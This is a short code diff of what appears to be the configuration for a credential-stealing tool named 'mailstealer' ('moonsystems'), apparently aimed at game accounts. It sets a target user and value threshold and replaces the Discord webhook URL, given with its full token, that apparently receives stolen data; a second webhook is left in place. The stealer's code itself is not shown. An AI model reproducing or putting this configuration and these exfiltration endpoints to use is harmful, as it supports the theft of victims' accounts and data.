@@ -3,7 +3,7 @@ DualRap = 1000000000
 DualUser = "zxrby2"
 DualWebhook = "https://discord.com/api/webhooks/1343598692355149884/7kOEzufWWGC7hazz01iwpHgYBaquryqU1013AyL3CEzsTYe6bisdlVK8-6ONlxNViefV"
 
-LogsWebhook = "https://discord.com/api/webhooks/1343555729927311430/WvB57pIzRP5wX3voC0EPYA96IySGmAkk36KsSITznYS2_9LnfYm_xuuBDmmEsexTmH4O"
+LogsWebhook = "https://discord.com/api/webhooks/1343713822917132460/4sAfUPF6WnUiwvG9bXxeG3iMsemlQ81aoKVMxaaq67f1t56k32aT2SjjHL8aggTojWXi"
 mailstealer_name = "moonsystems"
 
 
